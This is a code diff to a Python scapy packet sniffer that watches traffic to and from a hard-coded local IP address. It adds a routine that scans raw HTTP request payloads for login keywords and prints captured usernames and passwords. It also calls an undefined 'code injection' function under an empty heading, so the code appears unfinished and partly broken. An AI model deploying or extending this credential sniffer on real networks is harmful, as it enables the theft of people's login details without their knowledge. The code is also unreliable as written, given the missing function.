@@ -2,6 +2,7 @@
 import scapy.all as scapy
 #from scapy_ssl_tls.ssl_tls import *
 from scapy.layers import http
+import sys
 
 def initialise():
     scapy.sniff("eth0", store=False, prn=filter_packets)
@@ -10,7 +11,7 @@ def initialise():
 def get_protocol_data(packet, target, *args):
     #filter_function_dict = {"http":filter_http_packet(packet, target), "ARP":filter_ARP_packet(packet, target)\
     #,"ICMP":filter_ICMP_layer(packet, target)}
-    scapy_args = ["RAW", "TCP", "UDP", "ARP", "ICMP"] ## these will be checked against supplied protocols names in the optparse stage
+    scapy_args = ["RAW", "TCP", "UDP", "ARP", "ICMP", "Raw"] ## these will be checked against supplied protocols names in the optparse stage
     scapy_http_args = ["HTTPRequest", "HTTPResponse",]
     #test_args = ["http.HTTPRequest", "http.HTTPResponse"]
     if not args:
@@ -24,16 +25,35 @@ def get_protocol_data(packet, target, *args):
                     pass
             elif (protocol in scapy_http_args):
                 if (packet.haslayer(getattr(http, protocol))):
-                    print("http layer check")
+                    #print("http layer check")
                     packet_summary = filter_http_packet(packet, target) ## doing the http test case first
-                    display_outputs(packet_summary)
+                    if packet_summary is not None:
+                        display_outputs(packet_summary)
 
 
                 
 
 def display_outputs(packet_summary):
-        print(packet_summary[0])
-        print(packet_summary[1][0] + packet_summary[2][0] + "->" + packet_summary[1][1] + packet_summary[2][1])
+        try:
+            
+            if len(packet_summary) == 3:
+                print('\033[1;30;42m ')
+                pass
+                #print(str(packet_summary[0]).strip('()'))
+                #print(" | " + packet_summary[1][0] + " | " + packet_summary[2][0] + " | " + " --> " + " | " + packet_summary[1][1] + " | " + packet_summary[2][1] + " | ")
+            elif (len(packet_summary) == 4):
+                pass
+                #print("LOGIN DEETS")
+                #print(packet_summary[3])
+            print('\033[1;30;40m ---------------------------------------------------------------------------------------------------------------')
+        except TypeError:
+            print("Something has gone wrong, packet summary contains NoneType where it should be a tuple")
+            print("PACKET SUMMARY")
+            print(packet_summary)
+            print("")
+            print("continuing...")
+            
+
 
 
 
@@ -59,12 +79,16 @@ def filter_ICMP_layer(packet, target):
 
 def filter_http_packet(packet, target):
     #print("function call check")
-    if packet.haslayer(scapy.IP):
+    
+
+    if (packet.haslayer(scapy.IP) and packet.haslayer(scapy.Ether)):
         #print("ip layer check")
+        special_checks(packet)
         ether_tuple = filter_ethernet_layer(packet)
         ip_tuple = filter_IP_layer(packet)
         if ((target == ip_tuple[0]) or (target == ip_tuple[1])):
             #print("target match check")
+            #packet.show()
             if packet.haslayer(http.HTTPRequest):
                 request_tuple = filter_http_request(packet)
                 http_frame_request = (request_tuple, ip_tuple, ether_tuple)
@@ -77,13 +101,16 @@ def filter_http_packet(packet, target):
                 return http_frame_response
 
 
+def special_checks(packet):
+    filter_http_login(packet)
+    filter_code_injection(packet)
 
 def filter_http_request(packet):
     packet_type = "HTTP Request"
     url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
     method = packet[http.HTTPRequest].Method
     encoding = packet[http.HTTPRequest].Accept_Encoding
-    packet[http.HTTPRequest].show()
+    #packet[http.HTTPRequest].show()
     return (packet_type, url, method, encoding)
 
 
@@ -110,19 +137,25 @@ def filter_IP_layer(packet):
     dest_ip = packet[scapy.IP].dst
     return (source_ip, dest_ip)
 
+###################CODE INJECTION #############################
+
 ###################LOGIN SNIFFING #############################
 
     
 
 def filter_http_login(packet):
-    if packet.haslayer(http.HTTPRequest):
-        if packet.haslayer(scapy.Raw):
-            extract_login(packet[scapy.Raw].load)
+    print("check raw")
+    #packet.show()
+    if packet.haslayer(scapy.Raw) and packet.haslayer(http.HTTPRequest):
+        print("has raw layer")
+        return extract_login(packet[scapy.Raw].load)
 
 def extract_login(login_packet):
     login_identifier = ["user", "username", "user_name", "login", "email", "pass", "password", "pword"]
     for identifier in login_identifier:
         if identifier in login_packet:
+            #return ("[+] possible username/ password: " , login_packet)
+            print('\033[1;32;46m')
             print("[+] possible username/ password: " + login_packet)
             break
 
@@ -131,6 +164,7 @@ def extract_login(login_packet):
 
 
 def filter_packets(packet):
+    #packet.show()
     get_protocol_data(packet, "192.168.0.34", "HTTPRequest", "HTTPResponse")
     #filter_tls(packet)
     #filter_http_login(packet)
